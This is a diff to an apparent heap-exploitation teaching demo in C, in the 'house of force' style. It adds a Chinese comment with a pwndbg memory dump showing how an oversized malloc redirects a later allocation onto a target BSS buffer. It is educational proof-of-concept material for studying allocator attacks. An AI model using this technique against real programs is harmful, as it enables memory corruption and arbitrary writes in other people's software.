@@ -70,6 +70,17 @@ int main(int argc , char* argv[])
 	void *new_ptr = malloc(evil_size);
 	fprintf(stderr, "As expected, the new pointer is at the same place as the old top chunk: %p\n", new_ptr - sizeof(long)*2);
 
+/*
+此时的内存布局
+pwndbg> x/20xg bss_var-32
+0x555555756040: 0x0000000000000000  0x0000555555756048
+0x555555756050: 0x0000000000000000  0x00000000000010b9
+0x555555756060 <bss_var>:   0x2073692073696854  0x676e697274732061
+0x555555756070 <bss_var+16>:    0x6577207461687420  0x6f7420746e617720
+0x555555756080 <bss_var+32>:    0x6972777265766f20  0x00000000002e6574
+0x555555756090: 0x0000000000000000  0x0000000000000000
+*/
+
 	void* ctr_chunk = malloc(100);
 	fprintf(stderr, "\nNow, the next chunk we overwrite will point at our target buffer.\n");
 	fprintf(stderr, "malloc(100) => %p!\n", ctr_chunk);
